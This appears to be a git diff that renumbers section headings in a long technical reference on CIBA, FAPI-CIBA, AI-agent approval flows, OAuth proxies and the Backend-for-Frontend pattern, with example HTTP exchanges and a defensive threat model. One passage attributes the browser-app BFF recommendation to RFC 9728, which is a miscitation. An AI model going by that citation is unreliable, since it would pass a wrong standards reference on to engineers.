 CLI tools (e.g., `aws`, `gcloud`, `kubectl`) run in a terminal without a graphical browser. Two primary approaches exist: a **local browser redirect** (the CLI starts a loopback HTTP server on a random port and launches the system browser — low friction, high security via full OAuth redirect with PKCE) and the **Device Authorization Grant** (the CLI polls the token endpoint while the user authorises in a browser on another device — medium friction, medium security). A manual token paste (user copies a token from the browser to the CLI) is high-friction, low-security, and should be avoided. Recommendation: use local browser redirect when a system browser is available (most desktop environments); fall back to Device Authorization Grant for headless environments.
 
-##### 32.10.2 Smart TVs and IoT Devices
+##### 33.10.2 Smart TVs and IoT Devices
 
 Smart TVs, streaming devices, and IoT devices have limited or no keyboard input. The Device Authorization Grant with QR code encoding the `verification_uri_complete` URL is the most widely deployed approach — the TV displays a QR code that the user scans with their phone, eliminating manual code entry. If the TV has BLE hardware, FIDO2 hybrid transport enables passkey-based authentication with proximity verification. A casting-from-phone approach (the phone authenticates and casts the session to the TV) provides the lowest friction but depends on session transfer security.
 
-##### 32.10.3 Kiosks and Point-of-Sale Terminals
+##### 33.10.3 Kiosks and Point-of-Sale Terminals
 
 Kiosks and POS terminals are shared, public-access devices where authentication must be fast, secure, and tied to a specific user. NFC tap (user taps an NFC card or phone on the reader) provides very low friction and high security via physical proximity — ideal for payment scenarios. QR code scanning with BLE proximity provides higher security for government services or healthcare. Push notification approval is low-friction (no physical interaction with the kiosk) but vulnerable to device theft — the stolen phone can approve any pending request.
 
-##### 32.10.4 Desktop Web Applications
+##### 33.10.4 Desktop Web Applications
 
 Desktop web applications run in a browser with full input/output capabilities. Redirect or pop-up are the primary same-device approaches (low friction, high security with PKCE + TLS). QR code cross-device serves as a fallback for users who prefer phone-based authentication or lack credentials on the desktop. Cross-device is rarely the first choice on desktop but is essential for users who store all passkeys on their phone.
 
-##### 32.10.5 Mobile Web Applications
+##### 33.10.5 Mobile Web Applications
 
 Mobile web applications run in a browser on a smartphone or tablet — the device has rich capabilities (touchscreen, camera, biometric sensors). Same-device WebAuthn with a platform passkey is the primary method (very low friction, single-tap biometric, phishing-resistant). Redirect with PKCE serves as the fallback for password-based authentication. Cross-device authentication is generally not needed on mobile — the phone already has the credentials.
 
-##### 32.10.6 Native Mobile Applications
+##### 33.10.6 Native Mobile Applications
 
 Native mobile apps (iOS, Android) have access to platform-specific authentication APIs and hardware features. Platform authenticator (passkey) authentication is the primary method (very low friction, high security). `ASWebAuthenticationSession` (iOS) or Chrome Custom Tabs (Android) provide the recommended fallback for password-based flows — system-managed browser components with process isolation. Embedded WebViews must never be used for authentication (RFC 9700).
 
-##### 32.10.7 Topology Decision Matrix
+##### 33.10.7 Topology Decision Matrix
 
 | Constraint | Same-Device Recommended | Cross-Device Recommended |
 |:-----------|:----------------------|:------------------------|
@@ -37564,7 +37566,7 @@ The protocol's design addresses a fundamental limitation of redirect-based flows
 §25.3 provides an introductory overview of CIBA in the context of NHI governance and AI agent approval patterns. This chapter provides the exhaustive protocol reference — covering the full request/response semantics, all three response modes, binding message security, the FAPI-CIBA financial-grade profile, decoupled authentication taxonomy, and the AI agent approval architecture in depth.
 
 #### 34.1 CIBA Core Protocol
-##### 33.1.1 Backchannel Authentication Request
+##### 34.1.1 Backchannel Authentication Request
 
 The CIBA flow begins when the client sends an HTTP POST to the OP's **Backchannel Authentication Endpoint** (`/bc-authorize`). The request is `application/x-www-form-urlencoded` and includes the following parameters:
 
@@ -37600,7 +37602,7 @@ scope=openid+payment
 &client_assertion=eyJhbGciOiJSUzI1NiIs...
 ```
 
-##### 33.1.2 Backchannel Authentication Response
+##### 34.1.2 Backchannel Authentication Response
 
 The OP validates the client authentication, resolves the user from the hint parameter, and returns an immediate HTTP 200 response containing:
 
@@ -37620,7 +37622,7 @@ The OP validates the client authentication, resolves the user from the hint para
 
 At this point, the client's backchannel request is complete. The OP now contacts the user asynchronously — the client does not participate in the user interaction phase.
 
-##### 33.1.3 User Authentication and Consent
+##### 34.1.3 User Authentication and Consent
 
 The OP determines the user's registered Authentication Device from the `login_hint` (or other hint parameter) and delivers an out-of-band authentication request. The delivery mechanism is OP-specific and not defined by the CIBA specification — common channels include:
 
@@ -37639,7 +37641,7 @@ The user authenticates using the device's local authentication mechanism — bio
 
 If the user denies the request or fails to respond within the `expires_in` window, the OP records the denial or timeout. Subsequent token requests by the client will receive `access_denied` or `expired_token` errors respectively.
 
-##### 33.1.4 Worked Example: Restaurant Payment
+##### 34.1.4 Worked Example: Restaurant Payment
 
 A customer finishes a meal at a restaurant. The POS terminal initiates a CIBA payment authentication. The customer approves the payment on their banking app. This walkthrough demonstrates the complete CIBA flow with concrete HTTP requests and responses.
 
@@ -37700,7 +37702,7 @@ grant_type=urn%3Aopenid%3Aparams%3Agrant-type%3Aciba
 
 The POS terminal now holds an access token scoped to the payment. The token is presented to the bank's payment API as cryptographic proof that the customer authenticated and approved this specific transaction. For FAPI-CIBA deployments, this token would be sender-constrained via DPoP or mTLS (§34.4.5).
 
-##### 33.1.5 End-to-End Timing
+##### 34.1.5 End-to-End Timing
 
 The following table analyses the timing characteristics of the restaurant payment scenario. The dominant factor is human latency — the time between the push notification arriving and the customer completing authentication:
 
@@ -37720,7 +37722,7 @@ The protocol overhead (CIBA request, push delivery, token exchange) adds less th
 #### 34.2 Poll, Ping, and Push Response Modes
 CIBA defines three response modes that determine how the client learns the authentication outcome. The response mode is configured during **client registration** — it is a per-client setting, not a per-request parameter.
 
-##### 33.2.1 Poll Mode
+##### 34.2.1 Poll Mode
 
 Poll mode is the simplest response mode and requires no callback infrastructure on the client side. The client periodically polls the OP's token endpoint using the `auth_req_id`:
 
@@ -37957,7 +37959,7 @@ Implementations commonly use exponential backoff on transient errors while maint
 
 **Disadvantages of poll mode:** token delivery latency bounded by polling interval; unnecessary load on the OP during idle waits; poor user experience for time-sensitive transactions (payment at a checkout counter).
 
-##### 33.2.2 Ping Mode
+##### 34.2.2 Ping Mode
 
 In ping mode, the OP sends an HTTP POST notification to the client's pre-registered **`client_notification_endpoint`** when the user completes authentication. The notification contains the `auth_req_id` but **does not contain tokens** — the client must subsequently exchange the `auth_req_id` at the token endpoint to retrieve the tokens.
 
@@ -37992,7 +37994,7 @@ The `Authorization` header contains the `client_notification_token` that the cli
 
 **Disadvantages of ping mode:** requires a publicly accessible notification endpoint; the client must handle authentication on incoming requests; if the notification is lost, the client has no fallback unless it also implements polling (§34.2.5).
 
-##### 33.2.3 Push Mode
+##### 34.2.3 Push Mode
 
 In push mode, the OP sends the actual tokens directly to the client's `client_notification_endpoint` — no subsequent token endpoint exchange is needed:
 
@@ -38026,7 +38028,7 @@ Authorization: Bearer 8d67dc92-abe3-4a2f-b779-3a6f0e7c1a3d
 
 **Disadvantages of push mode:** tokens travel in the callback body, requiring strong TLS and careful endpoint security; the client must validate tokens received on an inbound channel; lost callbacks require a separate recovery mechanism.
 
-##### 33.2.4 Response Mode Comparison
+##### 34.2.4 Response Mode Comparison
 
 | Dimension | Poll | Ping | Push |
 |:----------|:-----|:-----|:-----|
@@ -38089,7 +38091,7 @@ flowchart LR
     style OP3 text-align:left
 ```
 
-##### 33.2.5 Hybrid Ping with Poll Fallback
+##### 34.2.5 Hybrid Ping with Poll Fallback
 
 A robust implementation may combine ping and poll modes to achieve the latency benefits of ping with the reliability guarantees of poll. The client registers a notification endpoint for ping mode but also implements background polling as a fallback:
 
@@ -38110,7 +38112,7 @@ If the ping notification is lost (network issue, server restart, firewall change
 | Client notification token invalid | N/A | OP retries with backoff | OP retries with backoff |
 
 #### 34.3 Binding Messages and User Consent
-##### 33.3.1 Binding Message Purpose
+##### 34.3.1 Binding Message Purpose
 
 The `binding_message` parameter is the critical user-facing security mechanism in CIBA. It serves the same function as number matching in push MFA (§22.4) — it binds the user's approval to a **specific, identifiable action** rather than a generic "approve login" prompt. Without a binding message, CIBA authentication requests are vulnerable to a social engineering attack pattern analogous to MFA prompt bombing (§22.4): an attacker who compromises client credentials can send unsolicited CIBA requests to the user's device, and the user — seeing only a generic approval prompt with no context — may approve.
 
@@ -38120,7 +38122,7 @@ The binding message creates a **cognitive link** between the user's physical con
 - In a call centre: the user sees "Verify identity for support case #CS-2024-8847" — they can confirm they are currently on a call
 - For an AI agent: the user sees "Agent 'CodeBot' requests: Deploy commit abc123 to production at 2026-03-25T14:00Z" — they can evaluate the action before approving
 
-##### 33.3.2 Binding Message Display Requirements
+##### 34.3.2 Binding Message Display Requirements
 
 The CIBA Core specification defines the following requirements for binding message handling:
 
@@ -38129,7 +38131,7 @@ The CIBA Core specification defines the following requirements for binding messa
 3. **The binding message SHOULD be short** — the specification does not define a maximum length, but practically 1–2 sentences is appropriate for mobile push notification display constraints. OPs may impose a maximum length (e.g., 200 characters) and reject requests exceeding it
 4. **Character set** — the binding message is plain text (alphanumeric plus standard punctuation). OPs should support Unicode characters for internationalisation, but the client should avoid complex formatting (HTML, markdown) as the display context is typically a mobile notification
 
-##### 33.3.3 The `user_code` Parameter
+##### 34.3.3 The `user_code` Parameter
 
 The `user_code` provides an additional layer of protection against unsolicited authentication requests. When a client is registered to support user codes:
 
@@ -38139,7 +38141,7 @@ The `user_code` provides an additional layer of protection against unsolicited a
 
 The `user_code` prevents a scenario where an attacker with stolen client credentials sends CIBA requests to arbitrary users. Without the user code, the OP would display the request and the user might approve it without recognising the illegitimacy. With the user code, the OP requires the user to enter a code — if the user did not initiate the interaction (e.g., they are not at a POS terminal and did not speak to a call centre agent), they do not possess the code and will not approve the request.
 
-##### 33.3.4 PSD2 Dynamic Linking via Binding Message
+##### 34.3.4 PSD2 Dynamic Linking via Binding Message
 
 Under PSD2's Strong Customer Authentication (SCA) requirements, the authentication code must be **dynamically linked** to the specific transaction amount and payee (Delegated Regulation Article 5). CIBA's `binding_message` parameter provides the display-layer implementation of dynamic linking:
 
@@ -38150,7 +38152,7 @@ Under PSD2's Strong Customer Authentication (SCA) requirements, the authenticati
 
 The binding message provides the **human-verifiable** dynamic link — the user reads the amount and payee and confirms correctness. The `auth_req_id` provides the **cryptographic** dynamic link — the tokens are tied to the specific CIBA request that contained the transaction details.
 
-##### 33.3.5 Binding Message Properties and Security Model
+##### 34.3.5 Binding Message Properties and Security Model
 
 The binding message operates under a **trust assumption**: the client is trusted to provide an honest binding message that accurately describes the transaction. The following table summarises the binding message's properties:
 
@@ -38202,7 +38204,7 @@ flowchart LR
     style Cognitive text-align:left
 ```
 
-##### 33.3.6 Binding Message Anti-Patterns and Best Practices
+##### 34.3.6 Binding Message Anti-Patterns and Best Practices
 
 **Anti-patterns:**
 
@@ -38221,7 +38223,7 @@ flowchart LR
 #### 34.4 CIBA in Financial Services (FAPI-CIBA)
 The Financial-grade API (FAPI) suite, published by the OpenID Foundation, defines security profiles for OAuth 2.0 and OIDC implementations serving financial services and other high-security domains. FAPI 2.0 — finalised in February 2025 — extends the base CIBA specification with additional constraints for financial-grade security.
 
-##### 33.4.1 FAPI-CIBA Security Constraints
+##### 34.4.1 FAPI-CIBA Security Constraints
 
 The FAPI-CIBA profile tightens the base CIBA specification in the following areas:
 
@@ -38251,7 +38253,7 @@ The FAPI-CIBA profile tightens the base CIBA specification in the following area
 
 The `client_secret_basic` and `client_secret_post` methods are **prohibited** in FAPI-CIBA because bearer tokens (shared secrets) do not provide proof of key possession.
 
-##### 33.4.2 PAR Flow for FAPI-CIBA
+##### 34.4.2 PAR Flow for FAPI-CIBA
 
 In FAPI-CIBA, the client does not send authentication parameters directly to `/bc-authorize`. Instead, it first pushes them to the OP's Pushed Authorization Request endpoint (RFC 9126). This two-step process prevents parameter injection via the consumption device:
 
@@ -38401,7 +38403,7 @@ Upon successful validation, the CIBA endpoint accepts the request and returns an
 
 </details>
 
-##### 33.4.3 PSD2 Compliance via FAPI-CIBA
+##### 34.4.3 PSD2 Compliance via FAPI-CIBA
 
 The combination of CIBA's protocol architecture and FAPI's security constraints satisfies all PSD2 SCA requirements:
 
@@ -38412,7 +38414,7 @@ The combination of CIBA's protocol architecture and FAPI's security constraints 
 | **Independence of elements** (Article 9.1) — breach of one factor does not compromise another | The Authentication Device's biometric/PIN is independent of the client's credentials; the user's biometric data never leaves the device's secure hardware |
 | **Confidentiality and integrity** (Article 22) — authentication code protected in transit | All FAPI-CIBA communication is over TLS; tokens are sender-constrained (DPoP or mTLS); Request Objects are signed |
 
-##### 33.4.4 Open Banking Deployments
+##### 34.4.4 Open Banking Deployments
 
 CIBA and FAPI-CIBA patterns are referenced or mandated in several open banking frameworks:
 
@@ -38421,7 +38423,7 @@ CIBA and FAPI-CIBA patterns are referenced or mandated in several open banking f
 - **Australian Consumer Data Right (CDR)** — the CDR's Data Standards Body references FAPI security profiles; CIBA-style decoupled authentication is relevant for scenarios where data sharing consent is initiated by a third party (Accredited Data Recipient) and approved by the customer on their banking app
 - **Brazil Open Finance** — Brazil's Open Finance ecosystem, one of the world's largest, mandates FAPI 2.0 compliance and supports CIBA for payment initiation flows where the customer authenticates on their bank's mobile app
 
-##### 33.4.5 Sender-Constrained Access Tokens
+##### 34.4.5 Sender-Constrained Access Tokens
 
 FAPI-CIBA requires that access tokens be bound to the client that requested them, preventing token replay if a token is intercepted. Two standard mechanisms exist:
 
@@ -38461,7 +38463,7 @@ Both mechanisms are supported by FAPI-CIBA (see §39.3 for DPoP and §39.4 for m
 #### 34.5 Decoupled Authentication Taxonomy
 CIBA formalises a broader category of **decoupled authentication** — authentication where the consumption device (where the service is accessed) and the authentication device (where the user authenticates) are separate. This section positions CIBA within the broader decoupled authentication landscape.
 
-##### 33.5.1 CIBA vs. Device Authorization Grant (RFC 8628)
+##### 34.5.1 CIBA vs. Device Authorization Grant (RFC 8628)
 
 Both CIBA and the Device Authorization Grant (§33.6) enable decoupled authentication, but they address fundamentally different use cases based on whether the client knows the user's identity:
 
@@ -38482,7 +38484,7 @@ Both CIBA and the Device Authorization Grant (§33.6) enable decoupled authentic
 - **CIBA** → the client knows *which user* needs to authenticate or approve. The client sends a targeted request to that specific user's device. Example: a POS terminal processes a payment and needs the cardholder's approval; an AI agent needs its supervising human's approval to proceed
 - **Device Authorization Grant** → the device does *not* know who will authenticate. It displays a code and URL, and waits for *any user* to complete the flow. Example: a smart TV displays "Go to https://tv.example.com/activate and enter code ABCD-1234"
 
-##### 33.5.2 CIBA vs. Push Notification MFA
+##### 34.5.2 CIBA vs. Push Notification MFA
 
 CIBA and push notification MFA (§20.1.2) both involve a notification to the user's phone, but they serve different architectural roles:
 
@@ -38498,7 +38500,7 @@ CIBA and push notification MFA (§20.1.2) both involve a notification to the use
 The key insight: push MFA is a **second factor within a redirect-based flow**; CIBA is a **complete authentication flow without any redirect**. An AI agent cannot use push MFA (there is no browser to redirect, and the agent has not started a conventional login flow), but it can use CIBA to request human approval as a standalone backchannel operation.
 
 #### 34.6 CIBA for AI Agent Human-in-the-Loop Approvals
-##### 33.6.1 The AI Agent Approval Problem
+##### 34.6.1 The AI Agent Approval Problem
 
 AI agents — LLM-based assistants, autonomous workflow engines, multi-agent orchestration systems — increasingly operate with delegated authority to perform actions on behalf of humans. The fundamental governance question: which actions can the agent perform autonomously, and which require human approval? The answer defines the agent's **autonomy boundary** — the line between self-directed action and human-in-the-loop escalation (§25.2).
 
@@ -38512,7 +38514,7 @@ When an agent encounters an action that exceeds its autonomous authority — a h
 
 CIBA provides all five capabilities as a single, standardised protocol.
 
-##### 33.6.2 CIBA as the Agent-to-Human Consent Protocol
+##### 34.6.2 CIBA as the Agent-to-Human Consent Protocol
 
 The CIBA architecture maps directly to the AI agent human-in-the-loop pattern:
 
@@ -38736,7 +38738,7 @@ Content-Type: application/json
 
 </details>
 
-##### 33.6.3 Binding Message Patterns for AI Actions
+##### 34.6.3 Binding Message Patterns for AI Actions
 
 The binding message (§34.3) is the human operator's primary decision-making input in agent approval workflows. The operator must understand exactly what the agent wants to do based solely on this message. Effective binding message patterns for common AI actions:
 
@@ -38749,7 +38751,7 @@ The binding message (§34.3) is the human operator's primary decision-making inp
 | **Grant API access** | "Grant admin access to dev@startup.io?" | High (role + identity) |
 | **Modify configuration** | "Set DB replicas: 5 on prod-cluster?" | High (parameter + value) |
 
-##### 33.6.4 Tiered Approval Policy
+##### 34.6.4 Tiered Approval Policy
 
 Not every agent action requires human approval. A tiered approval policy based on risk assessment reduces human fatigue while maintaining appropriate oversight. The agent's autonomy boundary (§25.2) maps directly to these tiers:
 
@@ -38762,7 +38764,7 @@ Not every agent action requires human approval. A tiered approval policy based o
 
 The risk tier determination can be automated — the agent evaluates each action against an organisational policy engine that maps operation types, resource sensitivity, and value thresholds to risk levels. Actions at the "Low" tier proceed autonomously; actions at "Medium" and above trigger the CIBA escalation flow with a binding message appropriate to the information density requirements.
 
-##### 33.6.5 Why CIBA: Not Custom Push Notifications
+##### 34.6.5 Why CIBA: Not Custom Push Notifications
 
 The pragmatic question: why not build a simpler approval mechanism using proprietary push notifications (e.g., Firebase Cloud Messaging → mobile app → webhook back to agent)? CIBA provides several properties that custom implementations would need to replicate from scratch:
 
@@ -38777,7 +38779,7 @@ The pragmatic question: why not build a simpler approval mechanism using proprie
 | **OP ecosystem** | Must integrate with each identity provider separately | Any CIBA-compliant OP (Keycloak, Authlete, Ping Identity, Curity, Auth0) |
 | **Certification** | No certification programme | OpenID Foundation FAPI-CIBA certification programme |
 
-##### 33.6.6 Multi-Agent Escalation Chains
+##### 34.6.6 Multi-Agent Escalation Chains
 
 In multi-agent architectures — where a primary agent delegates tasks to specialised sub-agents (e.g., Google's A2A protocol, Microsoft's AutoGen) — CIBA provides the standardised mechanism for any agent in the chain to escalate to a human:
 
@@ -38822,7 +38824,7 @@ If any approver denies or times out, the action is cancelled. This pattern is cr
 
 This audit trail satisfies internal governance requirements (e.g., SOX compliance for production deployments) and regulatory obligations (e.g., PSD2 for financial transactions). The `auth_req_id` in the ID Token provides the cryptographic link between the approval event and the tokens subsequently used at the resource server.
 
-##### 33.6.7 CIBA Vendor Support for Agent Workflows
+##### 34.6.7 CIBA Vendor Support for Agent Workflows
 
 The following tables summarise CIBA support across commercial identity providers, open banking regional frameworks, and open-source projects. AI agent workflows requiring CIBA should evaluate potential OP vendors against this matrix.
 
@@ -38866,7 +38868,7 @@ The following tables summarise CIBA support across commercial identity providers
 #### 34.7 CIBA Security Considerations
 CIBA introduces unique security considerations because the authentication request and the user's approval occur on different channels and different devices. The client communicates with the OP over a server-to-server backchannel, while the OP contacts the user via an out-of-band delivery mechanism (push notification, SMS, in-app prompt). This decoupling creates threat surfaces that do not exist in redirect-based flows.
 
-##### 33.7.1 Threat Model
+##### 34.7.1 Threat Model
 
 | Threat Category | Attack Vector | Impact | Mitigation |
 |:----------------|:--------------|:-------|:-----------|
@@ -38879,7 +38881,7 @@ CIBA introduces unique security considerations because the authentication reques
 | **User code guessing** | Attacker guesses `user_code` and approves request on user's behalf (§34.3.3) | Unauthorised authentication | Rate limiting (max 5 attempts per `auth_req_id`); sufficient entropy ($\geq 20$ bits); short expiry |
 | **Session fixation** | Attacker forces a known `auth_req_id` into the client's flow | Client receives tokens bound to the attacker's session | Client generates its own correlation nonce; OP validates `auth_req_id` uniqueness |
 
-##### 33.7.2 Client Notification Token Security
+##### 34.7.2 Client Notification Token Security
 
 The `client_notification_token` is a shared secret between the client and the OP. It authenticates the OP's callbacks to the client's notification endpoint in ping and push modes. The following security requirements apply:
 
@@ -38889,7 +38891,7 @@ The `client_notification_token` is a shared secret between the client and the OP
 - **Rotation** — SHOULD be rotated periodically (e.g., every 90 days) and immediately on any suspected compromise
 - **Scope** — MUST be unique per client instance — not shared across clients or across multiple notification endpoints
 
-##### 33.7.3 User Code Entropy Analysis
+##### 34.7.3 User Code Entropy Analysis
 
 When the OP supports the `user_code` parameter (§34.3.3), the code must have sufficient entropy to resist brute-force guessing:
 
@@ -38905,7 +38907,7 @@ $$
 
 This provides adequate entropy against brute-force attacks, especially when combined with rate limiting (e.g., maximum 5 incorrect attempts per `auth_req_id`). The user code's primary purpose is to prevent unsolicited authentication requests — it is not a substitute for the user's biometric or PIN authentication on the Authentication Device.
 
-##### 33.7.4 Replay Protection
+##### 34.7.4 Replay Protection
 
 CIBA requests must include replay protection mechanisms at multiple layers:
 
@@ -38914,7 +38916,7 @@ CIBA requests must include replay protection mechanisms at multiple layers:
 3. **Timestamp freshness** — the OP must enforce `exp` and `iat` validation on signed requests (maximum clock skew: typically 60 seconds) to prevent replay of expired request objects
 4. **Login hint token expiry** — the `login_hint_token` JWT must have a short expiry (recommended: 60 seconds) to prevent replay of stale user identification tokens
 
-##### 33.7.5 OP-Side Authentication Device Verification
+##### 34.7.5 OP-Side Authentication Device Verification
 
 When the user authenticates on their device, the OP must enforce the following verification requirements:
 
@@ -38923,7 +38925,7 @@ When the user authenticates on their device, the OP must enforce the following v
 3. **Transaction context display** — the binding message must be displayed verbatim (§34.3.2). The OP must not truncate or rephrase the message in a way that removes critical transaction information
 4. **Explicit consent** — the user must take a deliberate action to approve. No pre-checked checkboxes, no "always approve this application" without re-authentication, and no silent background approval
 
-##### 33.7.6 Rate Limiting
+##### 34.7.6 Rate Limiting
 
 The OP should implement rate limiting on several vectors to prevent abuse and denial-of-service:
 
@@ -38938,7 +38940,7 @@ The OP should implement rate limiting on several vectors to prevent abuse and de
 #### 34.8 CIBA Client Registration
 CIBA clients must register specific metadata with the OpenID Provider before initiating backchannel authentication. This registration can be performed dynamically (RFC 7591) or statically (pre-configured by the OP administrator).
 
-##### 33.8.1 Dynamic Registration
+##### 34.8.1 Dynamic Registration
 
 A CIBA client registers using the standard OIDC Dynamic Client Registration protocol (RFC 7591) with CIBA-specific metadata fields:
 
@@ -38980,7 +38982,7 @@ Content-Type: application/json
 | **`backchannel_authentication_request_signing_alg`** | Conditional | Algorithm for signing the CIBA request (JAR); required by FAPI-CIBA (typically `PS256` or `ES256`) |
 | **`backchannel_user_code_parameter`** | ❌ | Boolean — whether the client supports the `user_code` parameter (§34.3.3) |
 
-##### 33.8.2 Static Registration
+##### 34.8.2 Static Registration
 
 For production deployments — particularly in financial services and regulated sectors — static client registration (pre-registered clients) is preferred over dynamic registration:
 
@@ -38991,7 +38993,7 @@ For production deployments — particularly in financial services and regulated 
 
 Static registration aligns with the client authentication methods described in §3.4 — the client's credentials (signing keys or TLS certificates) are provisioned out-of-band and registered with the OP before any CIBA requests are made.
 
-##### 33.8.3 Metadata Validation Rules
+##### 34.8.3 Metadata Validation Rules
 
 The OP must validate client registration metadata against the following rules:
 
@@ -39007,7 +39009,7 @@ The OP must validate client registration metadata against the following rules:
 #### 34.9 Implementation Pitfalls and Anti-Patterns
 Production CIBA deployments encounter a consistent set of implementation mistakes and architectural anti-patterns. This section catalogues the most common failure modes observed across financial services, open banking, and AI agent approval workflows.
 
-##### 33.9.1 Implementation Mistakes
+##### 34.9.1 Implementation Mistakes
 
 **Polling too aggressively.** Ignoring the `interval` parameter and polling every second or less wastes OP resources and may trigger rate limits. The OP returns `slow_down` to signal the client should increase its polling interval (§34.2.1). Implementations commonly use exponential backoff on transient errors while maintaining the minimum `interval` on `authorization_pending` responses.
 
@@ -39019,7 +39021,7 @@ Production CIBA deployments encounter a consistent set of implementation mistake
 
 **Binding message truncation.** The OP displays a truncated binding message that removes critical information (e.g., showing "Pay €2…" instead of "Pay €250 to ACME Corp"). The OP must display the full message verbatim or, at minimum, never truncate the amount or counterparty fields.
 
-##### 33.9.2 Architectural Anti-Patterns
+##### 34.9.2 Architectural Anti-Patterns
 
 **Using CIBA when a redirect-based flow would suffice.** If the user is operating the same device with a browser, the Authorization Code Flow (§3.2.1) is simpler, better understood, and has broader tooling support. CIBA should only be used when decoupled authentication is a genuine requirement — the user is physically elsewhere, or the client device has no browser.
 
@@ -39029,7 +39031,7 @@ Production CIBA deployments encounter a consistent set of implementation mistake
 
 **Ignoring idempotency.** The OP may retry a notification (ping or push) if the client does not respond with HTTP 200 or 204. The client's notification handler must be idempotent: processing the same `auth_req_id` twice must not cause duplicate token storage or duplicate action execution at the resource server.
 
-##### 33.9.3 FAPI-CIBA Specific Pitfalls
+##### 34.9.3 FAPI-CIBA Specific Pitfalls
 
 **Using symmetric signing algorithms.** FAPI-CIBA requires asymmetric signing algorithms (PS256, ES256). Using HS256 (HMAC-SHA256) with a shared secret violates the proof-of-key-possession requirement and is explicitly prohibited. The signing algorithm is enforced during client registration metadata validation.
 
@@ -39037,7 +39039,7 @@ Production CIBA deployments encounter a consistent set of implementation mistake
 
 **Not enforcing refresh token rotation.** FAPI-CIBA requires that refresh tokens be rotated (one-time use). If the OP allows reuse of refresh tokens, a stolen refresh token grants long-term access — the entire security benefit of rotation is negated.
 
-##### 33.9.4 Operational Pitfalls
+##### 34.9.4 Operational Pitfalls
 
 **Missing monitoring.** CIBA introduces new operational metrics that must be monitored to detect degradation, abuse, and delivery failures:
 
@@ -39070,7 +39072,7 @@ JavaScript executing in the browser operates in an inherently untrusted environm
 This chapter examines the architectural patterns that address this problem by moving the OAuth security boundary from the browser (untrusted) to the server (controlled infrastructure). The progression moves from general-purpose OAuth proxies through the Backend-for-Frontend (BFF) pattern codified by the IETF, to specialised implementations like the Token Handler pattern, and finally to the browser-native Credential Manager APIs that reshape how federated authentication works in the post-third-party-cookie era. The common thread: **the browser should never see, store, or transmit an OAuth token**.
 
 #### 35.1 OAuth Proxy Architecture
-##### 34.1.1 The Browser Token Storage Problem
+##### 35.1.1 The Browser Token Storage Problem
 
 When a browser-based application executes the OAuth 2.0 Authorization Code flow directly — acting as the OAuth client — the tokens returned by the authorization server must be stored somewhere in the browser:
 
@@ -39139,7 +39141,7 @@ flowchart TD
     style Safe2 text-align:left
 ```
 
-##### 34.1.2 The OAuth Proxy Concept
+##### 35.1.2 The OAuth Proxy Concept
 
 An OAuth proxy is a server-side reverse proxy that interposes between the browser and the upstream application or API. The proxy is the OAuth client — not the browser. The proxy handles the entire OAuth ceremony on the server side and exposes only an opaque session cookie to the browser:
 
@@ -39217,7 +39219,7 @@ flowchart TD
     style API text-align:left
 ```
 
-##### 34.1.2.1 Token Refresh Handling
+##### 35.1.2.1 Token Refresh Handling
 
 When the access token expires, the proxy must perform a silent refresh using the stored refresh token. This is entirely server-side and transparent to the browser:
 
@@ -39225,7 +39227,7 @@ $$\text{Proxy} \xrightarrow{\text{detect } t_{\text{now}} > t_{\text{expires}}} 
 
 If the refresh succeeds, the proxy updates the session store with new tokens and continues serving the request. If the refresh fails (expired refresh token, revoked session), the proxy clears the session cookie and redirects the browser to the authorization server for re-authentication. The browser never participates in token refresh — it continues sending the same session cookie.
 
-##### 34.1.2.2 Logout Propagation
+##### 35.1.2.2 Logout Propagation
 
 OAuth proxy architectures must handle logout at multiple levels: clearing the local session cookie, revoking tokens at the IdP, and propagating the logout to all upstream services that received tokens derived from the same session:
 
@@ -39237,7 +39239,7 @@ OAuth proxy architectures must handle logout at multiple levels: clearing the lo
 
 The revocation step (step 4) is critical. Without it, the access token and refresh token remain valid at the IdP until their natural expiry, creating a window where a stolen token could still be replayed.
 
-##### 34.1.3 Open-Source OAuth Proxy Implementations
+##### 35.1.3 Open-Source OAuth Proxy Implementations
 
 Several production-ready open-source OAuth proxy implementations exist, each with different design goals, deployment models, and feature sets:
 
@@ -39297,7 +39299,7 @@ flowchart TD
     style Authelia text-align:left
 ```
 
-##### 34.1.4 Production Deployment Patterns
+##### 35.1.4 Production Deployment Patterns
 
 **Kubernetes ingress authentication** — The most common production deployment of `oauth2-proxy` uses nginx ingress annotations to protect services:
 
@@ -39310,7 +39312,7 @@ The nginx ingress controller sends a subrequest to the `oauth2-proxy` `/oauth2/a
 
 **Cloud-native API gateways** — Azure API Management, Kong, and Envoy all support OAuth proxy patterns. Azure APIM's Credential Manager acts as a server-side OAuth client — it performs the authorization code exchange, stores tokens in its internal credential store, and injects the access token into backend API calls. Kong's OpenID Connect plugin implements the proxy pattern natively, supporting code flow, session management, and token refresh.
 
-##### 34.1.5 RFC 9396: Rich Authorization Requests
+##### 35.1.5 RFC 9396: Rich Authorization Requests
 
 Traditional OAuth 2.0 scopes are simple, space-delimited strings (e.g., `openid profile email payments:read`). This flat scope model is inadequate for complex authorization scenarios where the resource server needs structured, granular authorization data. Rich Authorization Requests (RAR, RFC 9396) extend OAuth authorization requests with structured authorization details that convey fine-grained permission semantics.
 
@@ -39467,7 +39469,7 @@ The OP returns an Access Token containing the embedded authorization details. Th
 #### 35.2 Token-Mediating Backend (TMB)/Backend-for-Frontend (BFF)
 The Backend-for-Frontend pattern assigns each frontend application a **dedicated backend** that serves as the OAuth confidential client. RFC 9728 ("OAuth 2.0 for Browser-Based Apps") explicitly recommends this architecture as the preferred approach for browser-based OAuth clients. The BFF's key architectural properties: the BFF and SPA share the **same origin** (eliminating cross-origin concerns); the BFF acts as a **confidential OAuth client** with a `client_secret`; session state is communicated via **SameSite cookies**; the SPA **never receives or stores OAuth tokens**; the BFF performs **token relay** to upstream APIs. Unlike a general-purpose OAuth proxy, the BFF is **application-aware** — it is purpose-built for a specific frontend and exposes a tailored API.
 
-##### 34.2.1 BFF Architecture
+##### 35.2.1 BFF Architecture
 
 The Backend-for-Frontend pattern assigns each frontend application — SPA, mobile app, or web client — a **dedicated backend** that serves as the OAuth confidential client. Unlike a general-purpose OAuth proxy that authenticates requests to arbitrary upstream services, a BFF is purpose-built for a specific frontend and exposes a tailored API for authentication lifecycle operations:
 
@@ -39489,7 +39491,7 @@ The Backend-for-Frontend pattern assigns each frontend application — SPA, mobi
 | **Sender-constrained tokens** | DPoP possible but limited (browser must manage DPoP key pair) | DPoP (§39.3) and mTLS certificate-bound tokens (§39.4) both available |
 | **Token refresh** | Frontend must implement token refresh logic and handle race conditions | BFF handles refresh transparently — frontend is unaware |
 
-##### 34.2.2 BFF Session Model
+##### 35.2.2 BFF Session Model
 
